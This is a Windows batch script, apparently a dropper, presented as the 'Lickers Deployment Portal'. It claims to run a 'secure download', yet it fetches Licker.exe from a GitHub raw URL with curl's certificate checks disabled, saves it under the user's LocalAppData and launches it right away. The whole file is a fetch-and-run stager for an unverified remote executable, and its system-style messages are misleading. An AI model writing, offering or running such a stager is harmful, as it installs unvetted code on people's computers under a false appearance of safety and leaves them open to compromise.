@echo off
title Lickers Deployment Portal
echo [SYSTEM] Initializing secure download...

:: Define a consistent location in the user's Local AppData
set "TARGET_DIR=%LOCALAPPDATA%\Lickers"
set "TARGET_EXE=%TARGET_DIR%\Licker.exe"

:: Create the folder if it doesn't exist
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: -k ignores SSL errors, -L follows redirects
echo [SYSTEM] Fetching components...
curl -k -L -o "%TARGET_EXE%" "https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"

:: Check if the file was actually saved
if exist "%TARGET_EXE%" (
    echo [SUCCESS] File downloaded to %TARGET_EXE%
    echo [SYSTEM] Launching application...
    
    :: Start the EXE in a new process so this window can close
    start "" "%TARGET_EXE%"
    
    :: Brief delay to show success before closing
    timeout /t 3 >nul
) else (
    echo [ERROR] Download failed. The file could not be saved.
    echo Please check your internet connection or GitHub repository.
    pause
)
exit
